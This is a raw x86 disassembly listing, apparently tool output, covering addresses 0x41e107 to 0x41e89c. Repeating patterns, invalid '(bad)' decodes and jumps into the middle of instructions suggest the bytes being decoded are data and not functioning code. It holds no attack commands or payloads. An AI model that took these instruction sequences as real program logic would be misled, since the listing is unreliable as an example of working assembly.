  41e107:	sub    ch,BYTE PTR [edi+eax*2]
  41e10a:	aaa    
  41e10b:	sbb    eax,0x42450481
  41e110:	xor    BYTE PTR [edx-0x6598f71d],dh
  41e116:	xor    eax,0x41293043
  41e11b:	bound  eax,QWORD PTR [esi+eiz*1+0x48]
  41e11f:	inc    eax
  41e120:	and    DWORD PTR [ebp-0x3],ebx
  41e123:	jo     0x41e161
  41e125:	aas    
  41e126:	add    BYTE PTR [eax],0x0
  41e129:	inc    eax
  41e12a:	inc    eax
  41e12b:	cmovno eax,DWORD PTR ds:0x40056243
  41e132:	int3   
  41e133:	add    ah,cl
  41e135:	inc    eax
  41e136:	inc    eax
  41e137:	bound  eax,QWORD PTR [ecx+0x0]
  41e13a:	add    BYTE PTR [edi],cl
  41e13c:	inc    ebx
  41e13d:	inc    eax
  41e13e:	inc    eax
  41e13f:	add    BYTE PTR [ecx+0x43],al
  41e142:	add    eax,0x40256240
  41e147:	bound  eax,QWORD PTR [eax]
  41e149:	nop
  41e14a:	pusha  
  41e14b:	push   ecx
  41e14c:	inc    ecx
  41e14d:	and    ah,al
  41e14f:	and    BYTE PTR [eax+0x4f777a69],bh
  41e155:	xchg   ebp,eax
  41e156:	test   al,0xc3
  41e158:	fs inc edx
  41e15a:	and    eax,0xc2624252
  41e15f:	add    eax,0x4140cc00
  41e164:	inc    eax
  41e165:	inc    ebx
  41e166:	bound  esp,QWORD PTR ds:0x41400043
  41e16c:	add    BYTE PTR [eax],al
  41e16e:	add    eax,0x43624062
  41e173:	inc    ecx
  41e174:	inc    eax
  41e175:	inc    eax
  41e176:	inc    eax
  41e177:	add    eax,0x40624340
  41e17c:	add    eax,0x40664140
  41e181:	(bad)  
  41e182:	leave  
  41e183:	dec    esp
  41e184:	xor    BYTE PTR ds:0x4f264117,ch
  41e18a:	push   eax
  41e18b:	push   esp
  41e18c:	cmp    DWORD PTR [ebx+0x34],ebx
  41e18f:	cmp    al,0x40
  41e191:	fs js  0x41e1ca
  41e194:	adc    al,0x37
  41e196:	pop    ebp
  41e197:	ja     0x41e1b5
  41e199:	lahf   
  41e19a:	and    BYTE PTR [eax-0x47bf0b93],0xd1
  41e1a1:	bound  esp,QWORD PTR [ebx+0x20]
  41e1a4:	xor    al,0xd3
  41e1a6:	ss or  eax,0x5004327
  41e1ac:	inc    eax
  41e1ad:	js     0x41e1bf
  41e1af:	inc    ecx
  41e1b0:	bound  eax,QWORD PTR [eax+0x40]
  41e1b3:	sldt   WORD PTR [eax-0x34]
  41e1b7:	js     0x41e21b
  41e1b9:	add    eax,0x40664143
  41e1be:	inc    ebx
  41e1bf:	add    BYTE PTR [ecx+0x5],al
  41e1c2:	js     0x41e204
  41e1c4:	bound  eax,QWORD PTR [eax+0x0]
  41e1c7:	inc    eax
  41e1c8:	add    eax,0xf82e6a00
  41e1cd:	inc    eax
  41e1ce:	jnp    0x41e1ac
  41e1d0:	inc    ebx
  41e1d1:	adc    bh,cl
  41e1d3:	and    eax,0x694129d1
  41e1d8:	push   esp
  41e1d9:	xchg   ebp,eax
  41e1da:	inc    eax
  41e1db:	xor    al,0xf7
  41e1dd:	popa   
  41e1de:	xor    ebx,esp
  41e1e0:	add    eax,0x432e8263
  41e1e5:	inc    eax
  41e1e6:	lds    eax,FWORD PTR [edx+0x43]
  41e1e9:	adc    BYTE PTR [ebx],ch
  41e1eb:	das    
  41e1ec:	push   ecx
  41e1ed:	xor    BYTE PTR [ebp+eax*8-0x48],cl
  41e1f1:	xchg   esp,eax
  41e1f2:	inc    edx
  41e1f3:	add    edx,DWORD PTR [ebp+0x79]
  41e1f6:	inc    ecx
  41e1f7:	dec    edi
  41e1f8:	inc    ebx
  41e1f9:	jge    0x41e1e5
  41e1fb:	inc    eax
  41e1fc:	icebp  
  41e1fd:	dec    eax
  41e1fe:	inc    ecx
  41e1ff:	inc    ebx
  41e200:	inc    eax
  41e201:	inc    eax
  41e202:	add    eax,0x434162
  41e207:	inc    eax
  41e208:	add    BYTE PTR [edx+0x5],ah
  41e20b:	inc    eax
  41e20c:	adc    BYTE PTR [edx+0x40],ah
  41e20f:	inc    ebx
  41e210:	inc    ecx
  41e211:	add    eax,0x4340
  41e216:	add    eax,0x404162
  41e21b:	add    BYTE PTR [eax+0x43],al
  41e21e:	inc    eax
  41e21f:	add    eax,0x62597d3e
  41e224:	aam    0x40
  41e226:	dec    ecx
  41e227:	add    eax,0xb0bc5368
  41e22c:	bound  eax,QWORD PTR [eax+0x11]
  41e22f:	daa    
  41e230:	xor    al,0x62
  41e232:	push   ebx
  41e233:	jae    0x41e22f
  41e235:	inc    eax
  41e236:	pop    ecx
  41e237:	inc    ebx
  41e238:	inc    ecx
  41e239:	xchg   ecx,eax
  41e23a:	test   BYTE PTR ds:0x41359965,0x3d
  41e241:	bound  ebp,QWORD PTR [eax+0x5baa2d64]
  41e247:	push   edi
  41e248:	jle    0x41e247
  41e24a:	lods   al,BYTE PTR fs:[esi]
  41e24c:	gs jl  0x41e204
  41e24f:	inc    eax
  41e250:	data16 arpl WORD PTR [eax+0x0],ax
  41e254:	add    BYTE PTR [ecx+0x43],al
  41e257:	add    eax,0x41784062
  41e25c:	inc    eax
  41e25d:	inc    eax
  41e25e:	add    BYTE PTR [edi],cl
  41e260:	bound  eax,QWORD PTR [ebx+0x0]
  41e263:	add    eax,0x25006240
  41e268:	inc    eax
  41e269:	add    eax,0x40254143
  41e26e:	add    eax,0xf5620000
  41e273:	add    eax,0x296a9b47
  41e278:	mov    bh,0x85
  41e27a:	test   al,0xc9
  41e27c:	xor    al,0x92
  41e27e:	push   edi
  41e27f:	fld    DWORD PTR [ecx+0x38]
  41e282:	adc    al,BYTE PTR [edx-0x80]
  41e285:	adc    eax,0x5f3e426a
  41e28a:	mov    al,0x43
  41e28c:	vmaxps xmm4,xmm6,XMMWORD PTR [edx]
  41e290:	jae    0x41e27e
  41e292:	inc    ecx
  41e293:	dec    eax
  41e294:	push   esp
  41e295:	adc    ch,dh
  41e297:	inc    eax
  41e298:	stos   DWORD PTR es:[edi],eax
  41e299:	inc    ebx
  41e29a:	add    BYTE PTR [eax],al
  41e29c:	add    BYTE PTR [ecx+0x40],al
  41e29f:	bound  esp,QWORD PTR [esi+0x0]
  41e2a2:	inc    eax
  41e2a3:	add    eax,0x5400000
  41e2a8:	inc    ecx
  41e2a9:	inc    eax
  41e2aa:	inc    eax
  41e2ab:	bound  esp,QWORD PTR ds:0x25050043
  41e2b1:	inc    ecx
  41e2b2:	inc    ebx
  41e2b3:	inc    eax
  41e2b4:	test   BYTE PTR [eax+0x0],al
  41e2b7:	bound  ebx,QWORD PTR [eax+0x62]
  41e2ba:	inc    ecx
  41e2bb:	inc    eax
  41e2bc:	test   al,0xe8
  41e2be:	add    eax,0x2f73c742
  41e2c3:	test   al,0x10
  41e2c5:	sbb    BYTE PTR [esi+edx*2-0x72],al
  41e2c9:	mov    edi,0x62f47228
  41e2ce:	inc    ebp
  41e2cf:	and    BYTE PTR [edx+0x53515cf],cl
  41e2d5:	retf   
  41e2d6:	adc    BYTE PTR [edx+0x40],ah
  41e2d9:	inc    ecx
  41e2da:	and    eax,0x40000500
  41e2df:	inc    ebx
  41e2e0:	add    eax,0x40624041
  41e2e5:	inc    ebx
  41e2e6:	add    eax,0x43402541
  41e2eb:	bound  eax,QWORD PTR [eax+0x43]
  41e2ee:	int3   
  41e2ef:	inc    eax
  41e2f0:	bound  eax,QWORD PTR [eax]
  41e2f2:	inc    ecx
  41e2f3:	inc    eax
  41e2f4:	inc    eax
  41e2f5:	add    eax,0xa8ba2c05
  41e2fa:	ror    DWORD PTR [ecx+0x41],cl
  41e2fd:	retf   
  41e2fe:	push   edi
  41e2ff:	mov    eax,ds:0x4b6cd168
  41e304:	cmp    eax,0xa828d944
  41e309:	popa   
  41e30a:	xor    DWORD PTR [ecx-0x3b],eax
  41e30d:	push   0x964a8152
  41e312:	gs dec sp
  41e315:	les    ecx,FWORD PTR [edx]
  41e317:	ret    
  41e318:	aaa    
  41e319:	push   0x2c7b4251
  41e31e:	js     0x41e2d8
  41e320:	inc    eax
  41e321:	inc    eax
  41e322:	enter  0xb829,0xd8
  41e326:	arpl   WORD PTR [esi],di
  41e328:	sub    al,BYTE PTR [eax-0x4d]
  41e32b:	gs inc ecx
  41e32d:	test   al,0xb
  41e32f:	xlat   BYTE PTR ds:[ebx]
  41e330:	pop    ebx
  41e331:	inc    eax
  41e332:	push   esp
  41e333:	bound  eax,QWORD PTR [eax+0x25]
  41e336:	add    BYTE PTR [esi+0x40],ah
  41e339:	add    eax,0x40404143
  41e33e:	inc    ebx
  41e33f:	add    BYTE PTR [eax],al
  41e341:	add    BYTE PTR [edx-0x34],ah
  41e344:	inc    eax
  41e345:	add    eax,0x40004041
  41e34a:	inc    ecx
  41e34b:	int3   
  41e34c:	add    BYTE PTR [ebx-0x7c],al
  41e34f:	add    eax,0x5406240
  41e354:	bound  eax,QWORD PTR [eax-0x23]
  41e357:	adc    al,BYTE PTR [eax-0xcbfcd58]
  41e35d:	cs sbb al,0xa0
  41e360:	push   esp
  41e361:	xchg   ecx,eax
  41e362:	(bad)  
  41e363:	(bad)  [ebp-0x57ea9d81]
  41e369:	mov    esp,0x4056f524
  41e36e:	stos   DWORD PTR es:[edi],eax
  41e36f:	inc    ebx
  41e370:	adc    edi,edx
  41e372:	push   ss
  41e373:	sub    BYTE PTR [esi],0x23
  41e376:	test   al,0xc7
  41e378:	mov    esp,0xa8e7346b
  41e37d:	stos   BYTE PTR es:[edi],al
  41e37e:	fs in  al,dx
  41e380:	push   eax
  41e381:	push   ebx
  41e382:	add    BYTE PTR [edi+0x73],0x1e
  41e386:	xchg   ebx,eax
  41e387:	xor    DWORD PTR [edi],esi
  41e389:	dec    eax
  41e38a:	lds    eax,FWORD PTR [eax+0x62]
  41e38d:	pop    eax
  41e38e:	inc    ecx
  41e38f:	add    eax,0x40404340
  41e394:	inc    ebx
  41e395:	inc    eax
  41e396:	test   BYTE PTR [eax],al
  41e398:	add    eax,0x40624041
  41e39d:	inc    eax
  41e39e:	add    BYTE PTR [edx+0x5],ah
  41e3a1:	inc    ebx
  41e3a2:	add    BYTE PTR [eax+0x78],al
  41e3a5:	inc    ecx
  41e3a6:	add    BYTE PTR [eax+0x41],bl
  41e3a9:	(bad)  
  41e3aa:	retf   
  41e3ab:	mov    ebp,0x1a30d848
  41e3b0:	stos   BYTE PTR es:[edi],al
  41e3b1:	inc    ecx
  41e3b2:	cmp    DWORD PTR ds:[esi],ebp
  41e3b5:	aad    0x8c
  41e3b7:	pop    esp
  41e3b8:	ret    
  41e3b9:	inc    esi
  41e3ba:	dec    ecx
  41e3bb:	jne    0x41e3c7
  41e3bd:	jl     0x41e3cc
  41e3bf:	fs mov esp,0x45c8e3dc
  41e3c5:	ret    
  41e3c6:	jnp    0x41e428
  41e3c8:	inc    ecx
  41e3c9:	fs jge 0x41e3df
  41e3cc:	xor    bh,BYTE PTR [eax+esi*4+0x48220a4c]
  41e3d3:	inc    ecx
  41e3d4:	inc    edx
  41e3d5:	adc    eax,0xcc008440
  41e3da:	bound  eax,QWORD PTR ds:0xcc840f41
  41e3e0:	inc    ebx
  41e3e1:	add    BYTE PTR [eax+0x0],al
  41e3e4:	inc    eax
  41e3e5:	inc    eax
  41e3e6:	inc    eax
  41e3e7:	int3   
  41e3e8:	add    BYTE PTR ds:0x62404341,al
  41e3ee:	pop    eax
  41e3ef:	add    BYTE PTR [ebx+0x40],al
  41e3f2:	bound  ecx,QWORD PTR [edi]
  41e3f4:	inc    eax
  41e3f5:	or     eax,0x2aa8d062
  41e3fa:	shr    DWORD PTR [ecx],1
  41e3fc:	retf   
  41e3fd:	retf   
  41e3fe:	lock mov esp,0x764fbf12
  41e404:	mov    esp,0x4c0744bf
  41e409:	arpl   WORD PTR [ecx+0x42],dx
  41e40c:	inc    esi
  41e40d:	mov    edi,0x6b15dd65
  41e412:	ss and al,0x9e
  41e415:	mov    esi,0x71cb6e3d
  41e41a:	cdq    
  41e41b:	push   edx
  41e41c:	add    BYTE PTR [eax],al
  41e41e:	inc    eax
  41e41f:	inc    eax
  41e420:	cmovno eax,DWORD PTR ds:0x40056243
  41e427:	int3   
  41e428:	add    ah,cl
  41e42a:	inc    eax
  41e42b:	inc    eax
  41e42c:	bound  eax,QWORD PTR [ecx+0x0]
  41e42f:	add    BYTE PTR [edi],cl
  41e431:	inc    ebx
  41e432:	inc    eax
  41e433:	inc    eax
  41e434:	add    BYTE PTR [ecx+0x43],al
  41e437:	add    eax,0x40256240
  41e43c:	bound  eax,QWORD PTR [eax]
  41e43e:	js     0x41e3fb
  41e440:	pushf  
  41e441:	pop    eax
  41e442:	inc    esp
  41e443:	xor    cl,BYTE PTR [ebp+0x40]
  41e446:	arpl   bp,ax
  41e448:	mov    esp,0xd3946262
  41e44d:	cmc    
  41e44e:	mov    esp,0xd402454f
  41e453:	rol    BYTE PTR [ebx+0x29],0x70
  41e457:	mov    WORD PTR ds:0x35f363e0,ss
  41e45d:	jb     0x41e498
  41e45f:	add    eax,0x622ac953
  41e464:	mov    BYTE PTR [eax+0xe],0x7b
  41e468:	outs   dx,BYTE PTR ds:[esi]
  41e469:	bound  ebp,QWORD PTR [esp+ecx*1]
  41e46c:	jno    0x41e497
  41e46e:	test   al,0xb0
  41e470:	rcr    BYTE PTR [edi],0x34
  41e473:	xchg   ebx,eax
  41e474:	mov    edi,0x5e4d652e
  41e479:	ss add eax,0x4140cc00
  41e47f:	inc    eax
  41e480:	inc    ebx
  41e481:	bound  esp,QWORD PTR ds:0x41400043
  41e487:	add    BYTE PTR [eax],al
  41e489:	add    eax,0x43624062
  41e48e:	inc    ecx
  41e48f:	inc    eax
  41e490:	inc    eax
  41e491:	inc    eax
  41e492:	add    eax,0x40624340
  41e497:	add    eax,0x40664140
  41e49c:	fsubp  st(0),st
  41e49e:	jp     0x41e4e2
  41e4a0:	mov    eax,0xe3407f7a
  41e4a5:	and    dh,BYTE PTR [ebp+0x30]
  41e4a8:	addr16 add al,cl
  41e4ab:	mov    ah,0x62
  41e4ad:	push   0x6281402a
  41e4b2:	bound  eax,QWORD PTR [ecx+0x40]
  41e4b5:	int3   
  41e4b6:	aad    0x33
  41e4b8:	addr16 inc edx
  41e4ba:	or     DWORD PTR [esi+0x2a65fb1b],ebx
  41e4c0:	pop    ss
  41e4c1:	xor    al,0x43
  41e4c3:	add    BYTE PTR ds:0x41107840,al
  41e4c9:	bound  eax,QWORD PTR [eax+0x40]
  41e4cc:	sldt   WORD PTR [eax-0x34]
  41e4d0:	js     0x41e534
  41e4d2:	add    eax,0x40664143
  41e4d7:	inc    ebx
  41e4d8:	add    BYTE PTR [ecx+0x5],al
  41e4db:	js     0x41e51d
  41e4dd:	bound  eax,QWORD PTR [eax+0x0]
  41e4e0:	inc    eax
  41e4e1:	jo     0x41e4a7
  41e4e3:	leave  
  41e4e4:	jg     0x41e55a
  41e4e6:	dec    eax
  41e4e7:	outs   dx,DWORD PTR ds:[esi]
  41e4e8:	inc    eax
  41e4e9:	arpl   WORD PTR [ebx+0x62],sp
  41e4ec:	mov    bh,0x87
  41e4ee:	adc    esi,ebx
  41e4f0:	clc    
  41e4f1:	push   esi
  41e4f2:	cmp    al,0x5
  41e4f4:	(bad)  
  41e4f5:	bound  esi,QWORD PTR [edx]
  41e4f7:	or     BYTE PTR [ecx-0x57],al
  41e4fa:	push   eax
  41e4fb:	xchg   DWORD PTR [ecx],edx
  41e4fd:	xchg   ebx,eax
  41e4fe:	ds xchg ebp,eax
  41e500:	push   0xe6470ca4
  41e505:	dec    esi
  41e506:	inc    eax
  41e507:	mov    cl,0x18
  41e509:	xchg   esp,eax
  41e50a:	push   0x26d162ab
  41e50f:	bound  esp,QWORD PTR [ebx+0x47]
  41e512:	jmp    0x41e555
  41e514:	push   ebx
  41e515:	inc    esi
  41e516:	inc    eax
  41e517:	xor    eax,0x40404341
  41e51c:	add    eax,0x434162
  41e521:	inc    eax
  41e522:	add    BYTE PTR [edx+0x5],ah
  41e525:	inc    eax
  41e526:	adc    BYTE PTR [edx+0x40],ah
  41e529:	inc    ebx
  41e52a:	inc    ecx
  41e52b:	add    eax,0x4340
  41e530:	add    eax,0x404162
  41e535:	add    BYTE PTR [eax+0x43],al
  41e538:	inc    eax
  41e539:	add    eax,0x466263fc
  41e53e:	retf   0x60f1
  41e541:	jno    0x41e580
  41e543:	pop    esp
  41e544:	inc    ebp
  41e545:	fdivr  st,st(1)
  41e547:	dec    edx
  41e548:	and    al,0x3d
  41e54a:	ret    
  41e54b:	(bad)  
  41e54c:	xchg   ecx,eax
  41e54d:	add    eax,0x4841525a
  41e552:	inc    eax
  41e553:	sub    DWORD PTR [ebx],ebp
  41e555:	retf   
  41e556:	pop    ds
  41e557:	scas   eax,DWORD PTR es:[edi]
  41e558:	jl     0x41e568
  41e55a:	inc    ecx
  41e55b:	inc    eax
  41e55c:	mov    WORD PTR ds:0xbd40a738,?
  41e562:	adc    al,0x58
  41e564:	das    
  41e565:	rcr    BYTE PTR [ebp+0x40],cl
  41e568:	xor    eax,0x62633063
  41e56d:	inc    eax
  41e56e:	mov    al,0x60
  41e570:	push   es
  41e571:	inc    eax
  41e572:	add    BYTE PTR [eax],al
  41e574:	inc    ecx
  41e575:	inc    ebx
  41e576:	add    eax,0x41784062
  41e57b:	inc    eax
  41e57c:	inc    eax
  41e57d:	add    BYTE PTR [edi],cl
  41e57f:	bound  eax,QWORD PTR [ebx+0x0]
  41e582:	add    eax,0x25006240
  41e587:	inc    eax
  41e588:	add    eax,0x40254143
  41e58d:	add    eax,0xaa620000
  41e592:	add    eax,0x618cf93e
  41e597:	in     al,dx
  41e598:	jl     0x41e5ae
  41e59a:	xchg   DWORD PTR [eax-0x48],ebp
  41e59d:	imul   esi,edi,0x886d40d5
  41e5a3:	inc    eax
  41e5a4:	push   es
  41e5a5:	dec    esp
  41e5a6:	cwde   
  41e5a7:	and    DWORD PTR gs:[esi+0x15],edi
  41e5ab:	dec    eax
  41e5ac:	cmp    al,BYTE PTR [edx+0x43]
  41e5af:	add    BYTE PTR [eax],al
  41e5b1:	add    BYTE PTR [ecx+0x40],al
  41e5b4:	bound  esp,QWORD PTR [esi+0x0]
  41e5b7:	inc    eax
  41e5b8:	add    eax,0x5400000
  41e5bd:	inc    ecx
  41e5be:	inc    eax
  41e5bf:	inc    eax
  41e5c0:	bound  esp,QWORD PTR ds:0x25050043
  41e5c6:	inc    ecx
  41e5c7:	inc    ebx
  41e5c8:	inc    eax
  41e5c9:	test   BYTE PTR [eax+0x0],al
  41e5cc:	bound  ebx,QWORD PTR [eax+0x62]
  41e5cf:	inc    ecx
  41e5d0:	inc    eax
  41e5d1:	and    BYTE PTR [edi+0x7c],bh
  41e5d4:	js     0x41e59f
  41e5d6:	pop    esp
  41e5d7:	retf   
  41e5d8:	sub    eax,0x62404056
  41e5dd:	mov    eax,0x495d3fda
  41e5e2:	jne    0x41e611
  41e5e4:	test   eax,0xaab6715
  41e5e9:	mov    ch,0x51
  41e5eb:	or     al,0x47
  41e5ed:	inc    ebx
  41e5ee:	adc    BYTE PTR fs:[edx+0x40],ah
  41e5f2:	inc    ecx
  41e5f3:	and    eax,0x40000500
  41e5f8:	inc    ebx
  41e5f9:	add    eax,0x40624041
  41e5fe:	inc    ebx
  41e5ff:	add    eax,0x43402541
  41e604:	bound  eax,QWORD PTR [eax+0x43]
  41e607:	int3   
  41e608:	inc    eax
  41e609:	bound  eax,QWORD PTR [eax]
  41e60b:	inc    ecx
  41e60c:	inc    eax
  41e60d:	inc    eax
  41e60e:	add    eax,0xc3a84505
  41e613:	xchg   edx,eax
  41e614:	inc    eax
  41e615:	stos   BYTE PTR es:[edi],al
  41e616:	mov    BYTE PTR [edi-0x21],ah
  41e619:	bound  ebp,QWORD PTR [esi+0x69]
  41e61c:	cmp    DWORD PTR [edx],ecx
  41e61e:	adc    eax,0xf47347dd
  41e623:	pop    esi
  41e624:	inc    eax
  41e625:	fs retf 
  41e627:	shl    BYTE PTR ds:0x324b0162,1
  41e62d:	inc    edx
  41e62e:	mov    al,0x80
  41e630:	jo     0x41e674
  41e632:	pop    es
  41e633:	shr    eax,1
  41e635:	fmul   QWORD PTR ds:0x2b2a7660
  41e63b:	push   edi
  41e63c:	inc    eax
  41e63d:	xor    BYTE PTR [edx+0x40],ah
  41e640:	and    eax,0x5406600
  41e645:	inc    ebx
  41e646:	inc    ecx
  41e647:	inc    eax
  41e648:	inc    eax
  41e649:	inc    ebx
  41e64a:	add    BYTE PTR [eax],al
  41e64c:	add    BYTE PTR [edx-0x34],ah
  41e64f:	inc    eax
  41e650:	add    eax,0x40004041
  41e655:	inc    ecx
  41e656:	int3   
  41e657:	add    BYTE PTR [ebx-0x7c],al
  41e65a:	add    eax,0x5406240
  41e65f:	(bad)  
  41e660:	leave  
  41e661:	and    BYTE PTR [edx+0x41],ah
  41e664:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e665:	jno    0x41e688
  41e667:	dec    edi
  41e668:	lods   al,BYTE PTR ds:[esi]
  41e669:	jo     0x41e689
  41e66b:	sub    dl,dh
  41e66d:	inc    eax
  41e66e:	inc    esp
  41e66f:	fisttp QWORD PTR ds:0x4869fc8c
  41e675:	rol    BYTE PTR [eax+0x4b],1
  41e678:	inc    ebx
  41e679:	fcom   DWORD PTR [edx+0x34]
  41e67c:	push   esi
  41e67d:	xor    esi,DWORD PTR [ebx]
  41e67f:	xor    dh,BYTE PTR [eax+0x5c43411b]
  41e685:	pop    eax
  41e686:	pop    eax
  41e687:	inc    edx
  41e688:	inc    eax
  41e689:	bound  ebx,QWORD PTR [eax+0x41]
  41e68c:	add    eax,0x40404340
  41e691:	inc    ebx
  41e692:	inc    eax
  41e693:	test   BYTE PTR [eax],al
  41e695:	add    eax,0x40624041
  41e69a:	inc    eax
  41e69b:	add    BYTE PTR [edx+0x5],ah
  41e69e:	inc    ebx
  41e69f:	add    BYTE PTR [eax+0x78],al
  41e6a2:	inc    ecx
  41e6a3:	add    BYTE PTR [eax+0x41],bl
  41e6a6:	bound  ecx,QWORD PTR ds:0x4e52bcc8
  41e6ac:	fld    DWORD PTR [eax+0x3e]
  41e6af:	retf   
  41e6b0:	push   ebx
  41e6b1:	inc    eax
  41e6b2:	adc    BYTE PTR [ebp+esi*2+0x51595523],0x50
  41e6ba:	mov    gs:0x357b6830,al
  41e6c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e6c1:	add    dh,ch
  41e6c3:	add    bl,BYTE PTR [edi]
  41e6c5:	inc    eax
  41e6c6:	mov    esp,0x844085b8
  41e6cb:	add    ah,cl
  41e6cd:	bound  eax,QWORD PTR ds:0xcc840f41
  41e6d3:	inc    ebx
  41e6d4:	add    BYTE PTR [eax+0x0],al
  41e6d7:	inc    eax
  41e6d8:	inc    eax
  41e6d9:	inc    eax
  41e6da:	int3   
  41e6db:	add    BYTE PTR ds:0x62404341,al
  41e6e1:	pop    eax
  41e6e2:	add    BYTE PTR [ebx+0x40],al
  41e6e5:	bound  ecx,QWORD PTR [edi]
  41e6e7:	inc    eax
  41e6e8:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  41e6ea:	dec    ebx
  41e6eb:	inc    esi
  41e6ec:	mov    cs:0xd6636205,al
  41e6f2:	adc    esi,DWORD PTR [edx+ebp*2-0x23af84d5]
  41e6f9:	or     ch,al
  41e6fb:	lods   eax,DWORD PTR ds:[esi]
  41e6fc:	js     0x41e760
  41e6fe:	add    BYTE PTR [ecx+eax*2],0x54
  41e702:	mov    ch,BYTE PTR [edi+0x42]
  41e705:	dec    eax
  41e706:	add    eax,0xa3c99dfd
  41e70b:	add    BYTE PTR [eax],al
  41e70d:	inc    eax
  41e70e:	inc    eax
  41e70f:	cmovno eax,DWORD PTR ds:0x40056243
  41e716:	int3   
  41e717:	add    ah,cl
  41e719:	inc    eax
  41e71a:	inc    eax
  41e71b:	bound  eax,QWORD PTR [ecx+0x0]
  41e71e:	add    BYTE PTR [edi],cl
  41e720:	inc    ebx
  41e721:	inc    eax
  41e722:	inc    eax
  41e723:	add    BYTE PTR [ecx+0x43],al
  41e726:	add    eax,0x40256240
  41e72b:	bound  eax,QWORD PTR [eax]
  41e72d:	inc    ecx
  41e72e:	sub    BYTE PTR [ebx+ecx*8+0x62],al
  41e732:	xor    eax,0xd0f5a726
  41e737:	sub    DWORD PTR [ecx-0x37],esp
  41e73a:	sar    BYTE PTR [ebp+eax*8+0x4b2c42c9],cl
  41e741:	es sub eax,0x25d8db42
  41e747:	dec    esp
  41e748:	inc    eax
  41e749:	popa   
  41e74a:	bound  ecx,QWORD PTR [eax+eax*2+0x21]
  41e74e:	add    eax,0x4140cc00
  41e753:	inc    eax
  41e754:	inc    ebx
  41e755:	bound  esp,QWORD PTR ds:0x41400043
  41e75b:	add    BYTE PTR [eax],al
  41e75d:	add    eax,0x43624062
  41e762:	inc    ecx
  41e763:	inc    eax
  41e764:	inc    eax
  41e765:	inc    eax
  41e766:	add    eax,0x40624340
  41e76b:	add    eax,0x40664140
  41e770:	inc    eax
  41e771:	std    
  41e772:	dec    ebp
  41e773:	push   0xc
  41e775:	xor    BYTE PTR [eax+0x65],al
  41e778:	sub    eax,DWORD PTR [eax+ebx*4+0x62]
  41e77c:	bound  ecx,QWORD PTR [eax+0x2440d140]
  41e782:	push   0x406ba915
  41e787:	push   esp
  41e788:	and    DWORD PTR [eax],ebx
  41e78a:	inc    esp
  41e78b:	retf   
  41e78c:	sub    BYTE PTR [ebp+edi*1+0x284ce011],0x89
  41e794:	inc    eax
  41e795:	or     eax,0x437040ec
  41e79a:	add    BYTE PTR ds:0x41107840,al
  41e7a0:	bound  eax,QWORD PTR [eax+0x40]
  41e7a3:	sldt   WORD PTR [eax-0x34]
  41e7a7:	js     0x41e80b
  41e7a9:	add    eax,0x40664143
  41e7ae:	inc    ebx
  41e7af:	add    BYTE PTR [ecx+0x5],al
  41e7b2:	js     0x41e7f4
  41e7b4:	bound  eax,QWORD PTR [eax+0x0]
  41e7b7:	inc    eax
  41e7b8:	popf   
  41e7b9:	push   edi
  41e7ba:	jae    0x41e7fc
  41e7bc:	retf   
  41e7bd:	and    esi,DWORD PTR [eax+0x40]
  41e7c0:	inc    eax
  41e7c1:	popa   
  41e7c2:	nop
  41e7c3:	dec    ebp
  41e7c4:	inc    ecx
  41e7c5:	loope  0x41e7f2
  41e7c7:	pusha  
  41e7c8:	sbb    ch,dl
  41e7ca:	mov    edi,0x2ec880f8
  41e7cf:	inc    eax
  41e7d0:	arpl   WORD PTR [bx+si+0x4a],si
  41e7d4:	ret    
  41e7d5:	bndstx [ecx+edi*2],(bad)
  41e7d9:	inc    ebp
  41e7da:	inc    esp
  41e7db:	inc    esp
  41e7dc:	mov    al,0x7f
  41e7de:	jb     0x41e820
  41e7e0:	stos   DWORD PTR es:[edi],eax
  41e7e1:	mov    cl,dl
  41e7e3:	sub    BYTE PTR ds:0x422f6e12,al
  41e7e9:	inc    ecx
  41e7ea:	inc    ebx
  41e7eb:	inc    eax
  41e7ec:	inc    eax
  41e7ed:	add    eax,0x434162
  41e7f2:	inc    eax
  41e7f3:	add    BYTE PTR [edx+0x5],ah
  41e7f6:	inc    eax
  41e7f7:	adc    BYTE PTR [edx+0x40],ah
  41e7fa:	inc    ebx
  41e7fb:	inc    ecx
  41e7fc:	add    eax,0x4340
  41e801:	add    eax,0x404162
  41e806:	add    BYTE PTR [eax+0x43],al
  41e809:	inc    eax
  41e80a:	add    eax,0xcbc818cb
  41e80f:	aad    0x41
  41e811:	inc    eax
  41e812:	inc    esp
  41e813:	adc    DWORD PTR [edx+0x1f],esp
  41e816:	mov    esi,0x272ed1ad
  41e81b:	mov    eax,0x3902981f
  41e820:	leave  
  41e821:	shr    BYTE PTR [eax],0xd
  41e824:	dec    esp
  41e825:	sbb    al,0x4a
  41e827:	or     bl,BYTE PTR [ebx-0x57beb20b]
  41e82d:	cmp    al,0x8
  41e830:	ins    DWORD PTR es:[edi],dx
  41e831:	jnp    0x41e873
  41e833:	add    BYTE PTR [eax],al
  41e835:	inc    ecx
  41e836:	inc    ebx
  41e837:	add    eax,0x41784062
  41e83c:	inc    eax
  41e83d:	inc    eax
  41e83e:	add    BYTE PTR [edi],cl
  41e840:	bound  eax,QWORD PTR [ebx+0x0]
  41e843:	add    eax,0x25006240
  41e848:	inc    eax
  41e849:	add    eax,0x40254143
  41e84e:	add    eax,0x29620000
  41e853:	into   
  41e854:	adc    bl,BYTE PTR [edi]
  41e856:	sub    BYTE PTR [ecx+edx*4-0x47d7b3b6],dh
  41e85d:	xchg   esp,eax
  41e85e:	adc    eax,0x44f53b70
  41e863:	cs inc edx
  41e865:	push   0xffffffcb
  41e867:	push   ebx
  41e868:	adc    ebx,DWORD PTR [edi+0x29]
  41e86b:	cmp    BYTE PTR [edx+0x453b89d0],bh
  41e871:	xlat   BYTE PTR ds:[ebx]
  41e872:	adc    al,0x62
  41e874:	clc    
  41e875:	gs jae 0x41e80c
  41e878:	adc    DWORD PTR [ebx+0x4d],eax
  41e87b:	xor    BYTE PTR [edx-0x5d],dl
  41e87e:	inc    ecx
  41e87f:	inc    esi
  41e880:	inc    eax
  41e881:	sbb    al,0xc9
  41e883:	inc    ebx
  41e884:	add    BYTE PTR [eax],al
  41e886:	add    BYTE PTR [ecx+0x40],al
  41e889:	bound  esp,QWORD PTR [esi+0x0]
  41e88c:	inc    eax
  41e88d:	add    eax,0x5400000
  41e892:	inc    ecx
  41e893:	inc    eax
  41e894:	inc    eax
  41e895:	bound  esp,QWORD PTR ds:0x25050043
  41e89b:	inc    ecx
  41e89c:	inc    ebx
